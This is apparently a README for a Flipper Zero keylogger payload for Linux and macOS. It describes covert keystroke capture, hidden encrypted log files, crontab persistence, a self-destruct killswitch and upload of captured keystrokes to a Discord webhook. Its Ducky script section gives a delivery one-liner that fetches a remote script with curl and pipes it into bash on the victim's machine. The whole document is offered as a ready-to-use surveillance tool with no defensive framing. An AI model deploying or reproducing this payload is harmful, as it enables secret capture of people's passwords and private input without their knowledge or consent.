# Keylogger Unix

**Version:** 2.0  
**Author:** I am TBJr  
**Platform:** Linux (X11 · Wayland) · macOS  
**Delivery:** Flipper Zero HID (terminal one-liner)

---

## What it does

Platform-aware keystroke logger. Captures input using the best available method for each OS/session type, buffers keystrokes in memory, AES-encrypts flushes, appends length-prefixed chunks to a hidden log file, and optionally uploads the encrypted log to a Discord webhook.

---

## Platform support

| Environment | Method | Root required |
|---|---|---|
| Linux X11 | `xinput test <keyboard-id>` | No |
| Linux Wayland | `evtest` on `/dev/input/event*` | Yes |
| macOS | Python `CGEventTap` via `pyobjc` | No (Accessibility permission required) |

> **Previous version** used `script -c "cat"` which only recorded a single terminal session and captured nothing from GUI applications. That approach has been replaced entirely.

---

## Features

- **Linux X11**: `xinput` finds the physical keyboard automatically (skips virtual/consumer devices); keycodes decoded to readable characters at runtime via `xmodmap -pke`
- **Linux Wayland**: uses `evtest` if root; exits with clear instructions if unprivileged
- **macOS**: checks for Accessibility permission; uses `Quartz.CGEventTap` via Python `pyobjc`; exits with setup instructions if permission or `pyobjc` is missing
- **AES-128-CBC encryption** with `-pbkdf2` (required on OpenSSL 3.x — Ubuntu 22.04+); random IV per chunk; length-prefixed chunks appended to log file
- **Configurable flush/upload intervals** via `FLUSH_SECS` and `UPLOAD_SECS` at the top of the script
- **Killswitch** — self-destructs and removes crontab entry after `KILLSWITCH_DATE` (cross-platform date handling for both GNU `date -d` and macOS `date -j -f`)
- **Persistence** via `@reboot` crontab entry pointing to a real saved copy of the script (fixes the `realpath "$0"` = `/bin/bash` bug when running via curl pipe)
- **Optional Discord upload** — disabled when `DISCORD_WEBHOOK="REPLACE_ME"`

## Setup

1. Open `host/keylogger_unix.sh`
2. Set `DISCORD_WEBHOOK`, `FLUSH_SECS`, `UPLOAD_SECS`, `KILLSWITCH_DATE` at the top
3. Host on GitHub Pages

## macOS prerequisites

```bash
pip3 install pyobjc
# Then: System Settings > Privacy & Security > Accessibility → add Terminal
```

## Ducky script

```
GUI r
DELAY 600
STRING bash -c "$(curl -fsSL https://tbjr.github.io/Flipper-payloads/host/keylogger_unix.sh)"
ENTER
```

## Log file location

```
~/.local/share/.sysd/.dump-<8hex>       ← plaintext buffer (transient)
~/.local/share/.sysd/.dump-<8hex>.enc   ← encrypted chunks
~/.local/share/.sysd/.kl_runner.sh      ← persisted copy of this script
~/.local/share/.sysd/.kl_start.sh      ← @reboot stub
```

## Known limitations

- X11 keylogger captures input only while an X11 session is active; switching to a Wayland compositor stops capture
- Wayland capture requires root on all mainstream distros
- macOS CGEventTap requires both Accessibility permission and `pyobjc` — not zero-click on a fresh machine

## Credits

Inspired by I am Jakoby. Rebuilt for Unix platforms by **TBJr**.
